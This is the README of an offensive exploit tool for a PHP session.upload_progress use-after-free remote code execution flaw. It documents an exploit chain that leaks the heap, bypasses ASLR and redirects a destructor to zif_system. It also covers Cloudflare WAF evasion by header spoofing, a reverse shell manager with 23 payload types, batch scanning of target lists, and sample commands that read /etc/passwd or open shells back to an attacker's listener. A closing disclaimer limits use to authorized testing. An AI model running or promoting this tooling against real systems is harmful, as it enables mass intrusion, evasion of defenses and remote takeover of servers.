# php2shell Unified Exploit Orchestrator

**Author:** TESTERXMA  
**CVEs:** CVE-2026-109618, CVE-2026-109619 (php2shell)  
**ASLR Bypass Source:** [php2shell-bypass-aslr-exp](https://github.com/9bie/php2shell-bypass-aslr-exp) by 9bie

---

## 🎯 Overview

Unified exploit orchestrator for **CVE-2026-109618/619** (php2shell - PHP session.upload_progress UAF RCE) with integrated **ASLR bypass techniques** from [php2shell-bypass-aslr-exp](https://github.com/9bie/php2shell-bypass-aslr-exp) by **9bie**.

### 🎯 Target Vulnerability
- **CVE-2026-109618/619**: PHP session.upload_progress use-after-free RCE
- **Affected**: PHP 8.0.x (< 8.0.30), 8.1.x (< 8.1.42), 8.2.x (< 8.2.35), 8.3.x (< 8.3.36), 8.4.x (< 8.4.27)
- **Vector**: `session.upload_progress` + `multipart/form-data` + `PHP_SESSION_UPLOAD_PROGRESS`

---

## 🚀 Features

### 🎯 Core Exploit (CVE-2026-109618/619)
- **A1**: END-cleanup `send_cookie` OOM → dangling `PS(id)` / `PS(mod_data)`
- **B1**: Stale-id OOB read → heap leak (libphp + main chunk base)
- **A2**: Cheap-OOM → dangling `PS(http_session_vars)`
- **B2**: Fake reference + fake `zend_array` → `pDestructor = zif_system` → RCE

### 🛡️ ASLR Bypass Techniques (from 9bie's php2shell-bypass-aslr-exp)
| Technique | Description |
|-----------|-------------|
| **Worker Pinning** | Holds N-1 workers (149/150) to force same Apache child |
| **Chunked Encoding** | `Transfer-Encoding: chunked` bypasses `post_max_size` |
| **B1 Heap Leak** | Stale-id OOB read via forged `zend_string` → leaks libphp + chunk base |
| **Leak Analysis** | `parse_leak()` with bucket analysis & `MAIN_BUCKET_COUNT=87` fingerprint |
| **Offset Profiles** | x86_64 & aarch64 specific offsets (`dtor_offset`, `zif_offset`) |

### ☁️ Cloudflare WAF Bypass
- Header obfuscation (X-Forwarded-For, CF-Connecting-IP spoofing)
- Chunked encoding / slowloris fragmentation
- Parameter pollution (duplicate headers, case variation)
- Encoding bypass (URL encoding, double encoding, Unicode)
- HTTP method override / Cookie manipulation

### 🐚 Reverse Shell Manager
- 23 payload types (bash, python3, php, perl, nc, socat, powershell, etc.)
- Auto-listener (nc) in new terminal / tmux / screen / background
- TTY upgrade (pty.spawn, stty raw, TERM=xterm-256color)
- Interactive session with TTY support

### 🎯 Target & Lab Features
- Flexible targeting: `--url`, `--host/--port/--path`, `--batch` files
- Custom headers (`-H`), batch scanning, resume capability
- Docker restart (`--restart container_name`)
- Multi-target batch scanning with table output

---

## 📦 Installation

```bash
# Requirements
apt update && apt install -y python3 python3-pip socat netcat-openbsd
pip3 install -r requirements.txt  # if any

# Clone / Copy exploit.py
cp exploit.py /usr/local/bin/php2shell
chmod +x /usr/local/bin/php2shell
```

---

## 🚀 Quick Start

```bash
# 1. Basic exploit (ASLR bypass enabled)
python3 exploit.py --url http://target.com --aslr-bypass

# 2. With Cloudflare WAF bypass
python3 exploit.py --url https://target.com --waf-bypass --aslr-bypass

# 3. Reverse shell with ASLR bypass
python3 exploit.py --url http://target.com --connection --lhost 10.10.14.5 --lport 4444 --aslr-bypass

# 4. Full ASLR bypass (worker pinning + leak analysis)
python3 exploit.py --url http://target --aslr-bypass --workers 150 --leak-analysis
```

---

## 🎯 Usage Examples

### Basic Exploit
```bash
# Simple exploit with ASLR bypass
python3 exploit.py --url http://target.com --aslr-bypass

# With custom command
python3 exploit.py --url http://target.com --aslr-bypass --cmd "cat /etc/passwd"
```

### Cloudflare WAF Bypass
```bash
# WAF bypass + ASLR bypass
python3 exploit.py --url https://target.com --waf-bypass --aslr-bypass

# With custom headers
python3 exploit.py --url https://target.com -H "X-Forwarded-For: 127.0.0.1" -H "User-Agent: CustomAgent" --waf-bypass
```

### Reverse Shell
```bash
# Basic reverse shell
python3 exploit.py --url http://target --connection --lhost 10.10.14.5 --lport 4444

# With specific shell type & terminal
python3 exploit.py --url http://target --connection --lhost 10.10.14.5 --lport 4444 \
  --shell-type python3 --terminal gnome-terminal
```

### ASLR Bypass Only (Maximum Options)
```bash
# Full ASLR bypass with all techniques
python3 exploit.py --url http://target --aslr-bypass --workers 150 --leak-analysis

# Custom worker count
python3 exploit.py --url http://target --aslr-bypass --workers 150 --leak-analysis --leak-retries 5
```

### Batch Scanning
```bash
# Create targets file
cat > targets.txt << EOF
http://target1.com
http://target2.com:8080/path
https://target3.com
EOF

# Batch scan with table output
python3 exploit.py --batch targets.txt --aslr-bypass --format table -o results.json
```

### Lab Environment
```bash
# With Docker container restart
python3 exploit.py --url http://lab.local --restart php2shell-container --aslr-bypass

# Custom docker command
python3 exploit.py --url http://lab.local --restart container --docker-cmd "podman"
```

### Output Formats
```bash
# JSON (default)
python3 exploit.py --url http://target --aslr-bypass -o results.json

# CSV for spreadsheet
python3 exploit.py --batch targets.txt --aslr-bypass --format csv -o results.csv

# Table view
python3 exploit.py --batch targets.txt --aslr-bypass --format table
```

---

## ⚙️ Command Reference

### Target Specification
| Option | Description |
|--------|-------------|
| `--url URL` | Full target URL (scheme://host:port/path) |
| `--host HOST` | Target hostname or IP |
| `--port PORT` | Target port (default: 80) |
| `--scheme http\|https` | Scheme (default: http) |
| `--path PATH` | Target path (default: /) |
| `--batch FILE` | File with targets (one per line) |

### Exploit Options
| Option | Description |
|--------|-------------|
| `--cmd CMD` | Command to execute (default: id) |
| `--expect BYTES` | Expected output for success detection |
| `--call ADDR` | `zend_call_function` address (hex) |
| `--dtor ADDR` | `zval_ptr_dtor` address (hex) |
| `--stall SEC` | Stall duration (default: 1.5) |
| `--monitor` | Monitor upload progress |
| `--progress-path PATH` | Progress endpoint (default: /check_progress.php) |
| `--rounds N` | Trigger rounds (default: 1) |
| `--timeout SEC` | Request timeout (default: 30) |
| `--retries N` | Retry attempts (default: 3) |
| `--arch auto\|x86_64\|aarch64` | Target architecture |
| `--workers N` | Prefork workers (default: 150) |

### ASLR Bypass Options
| Option | Description |
|--------|-------------|
| `--aslr-bypass` | Enable all ASLR bypass techniques |
| `--worker-pinning` | Enable worker pinning (holds N-1 workers) |
| `--workers N` | Worker count for pinning (default: 150) |
| `--chunked-encoding` | Chunked encoding to bypass post_max_size |
| `--leak-analysis` | Enable B1 heap leak analysis |
| `--leak-retries N` | Leak retries (default: 3) |

### Cloudflare WAF Bypass
| Option | Description |
|--------|-------------|
| `--waf-bypass` | Enable Cloudflare WAF bypass |
| `-H, --custom-header` | Custom header 'Name: Value' (repeatable) |

### Reverse Shell
| Option | Description |
|--------|-------------|
| `--connection` | Enable reverse shell mode |
| `--lhost IP` | Listener host (your IP) |
| `--lport PORT` | Listener port (default: 4444) |
| `--shell-type TYPE` | Payload type (23 types available) |
| `--terminal TYPE` | Terminal for listener (gnome-terminal, tmux, etc.) |
| `--listener-timeout SEC` | Listener timeout (default: 30) |
| `--no-interact` | Don't auto-attach to shell |

### Lab Environment
| Option | Description |
|--------|-------------|
| `--restart NAME` | Docker container to restart before exploit |
| `--docker-cmd CMD` | Docker command (default: sudo docker) |

### Output
| Option | Description |
|--------|-------------|
| `-o, --output FILE` | Output file (default: exploit_results.json) |
| `--format json\|csv\|table` | Output format |
| `--outdir DIR` | Output directory for proofs |
| `--proof FILE` | Proof file path |
| `--resume FILE` | Resume from previous run |
| `-v, --verbose` | Verbose output |

---

## 🔧 ASLR Bypass Technical Details

### Worker Pinning
```bash
# Holds MaxRequestWorkers-1 children with incomplete POST bodies
# Forces A1/B1/A2/B2 to same Apache child
--workers 150  # Default: 150 (official prefork)
```

### Chunked Encoding Bypass
```bash
# Bypasses post_max_size via Transfer-Encoding: chunked
# rfc1867_post_handler only checks content_length at entry
--chunked-encoding
```

### B1 Heap Leak
```bash
# Leaks libphp base + main chunk base via Set-Cookie
# Uses forged zend_string header (refcount=0, type=0x16, len=0xC8000)
--leak-analysis
```

### Leak Analysis
```
1. Parses Set-Cookie header (800KB+ heap data)
2. Extracts 64-bit pointers from decoded cookie
3. Finds zval_ptr_dtor pointer (appears 1095x in 800KB)
4. Calculates: libphp = zval_ptr_dtor - 0x65EB60 (x86_64)
5. Bucket analysis (2MiB alignment) → chunk bases
4. MAIN_BUCKET_COUNT=87 fingerprint for main chunk
```

### Offset Profiles
| Symbol | x86_64 | aarch64 |
|--------|--------|---------|
| `zval_ptr_dtor` | `libphp+0x65EB60` | `libphp+0x63812B` |
| `zif_system` | `libphp+0x465370` | `libphp+0x42CD70` |

---

## 🐚 Reverse Shell Payloads (23 Types)

| Category | Types |
|----------|-------|
| **Bash** | `bash`, `bash_readline`, `bash_coprocess` |
| **Python** | `python3`, `python3_short`, `python` |
| **PHP** | `php`, `php_exec` |
| **Perl** | `perl`, `perl_short` |
| **Netcat** | `nc`, `nc_openbsd`, `nc_mkfifo`, `ncat` |
| **Socat** | `socat`, `socat_pty`, `socat_openssl` |
| **PowerShell** | `powershell`, `powershell_short` |
| **Others** | `ruby`, `lua`, `go`, `awk` |

```bash
# List all
python3 exploit.py --list-shells

# Use specific
--shell-type python3 --terminal gnome-terminal
```

---

## 📤 Output Formats

```bash
# JSON (default)
python3 exploit.py --url http://target --aslr-bypass -o results.json

# CSV for spreadsheets
python3 exploit.py --batch targets.txt --format csv -o results.csv

# Table view
python3 exploit.py --batch targets.txt --format table
```

---

## 📁 Output Structure

```json
{
  "target": "http://target.com/",
  "cves": ["CVE-2026-109618", "CVE-2026-109619"],
  "author": "TESTERXMA",
  "timestamp": "2026-10-25T17:30:00",
  "config": {
    "aslr_bypass": {
      "worker_pinning": true,
      "worker_count": 150,
      "chunked_encoding": true,
      "leak_analysis": true
    }
  },
  "fingerprint": {
    "php_version": "8.4.12",
    "server": "LiteSpeed",
    "likely_vulnerable": true
  },
  "chain_618": [...],
  "chain_619": {...},
  "aslr_bypass": {
    "worker_pinning": {"enabled": true, "holders": 149},
    "leak_analysis": {
      "enabled": true,
      "leaked": true,
      "libphp_base": "0x7f1234567890",
      "main_chunk_base": "0x7f1234000000",
      "arch": "x86_64"
    },
    "chunked_encoding": {"enabled": true}
  },
  "success": true,
  "proof": "uid=33(www-data) gid=33(www-data)"
}
```

---

## ⚠️ Legal & Ethics

> **⚠️ AUTHORIZED USE ONLY**
> 
> This tool is for **authorized vulnerability research and reproduction only**.
> Only use against systems you own or have explicit written permission to test.
> Unauthorized access to computer systems is illegal.
> 
> The author assumes no liability for misuse.

---

## 📚 References

- [php2shell-bypass-aslr-exp](https://github.com/9bie/php2shell-bypass-aslr-exp) by 9bie
- [php2shell](https://github.com/9bie/php2shell) - Original exploit
- [Cloudflare Blog: php2shell protection](https://blog.cloudflare.com/php-vulnerabilities-waf-protection)
- [Imperva: Node2Shell](https://www.imperva.com/blog/node2shell-from-brotli-data-to-remote-code-execution)
- [Sysdig: Node2Shell Detection](https://www.sysdig.com/blog/node2shell-cve-2026-111497)

---

## 👤 Author

**TESTERXMA**  
Enhanced with ASLR bypass techniques from [php2shell-bypass-aslr-exp](https://github.com/9bie/php2shell-bypass-aslr-exp) by **9bie**

---

## 📄 License

For authorized security research only. See LICENSE file if applicable.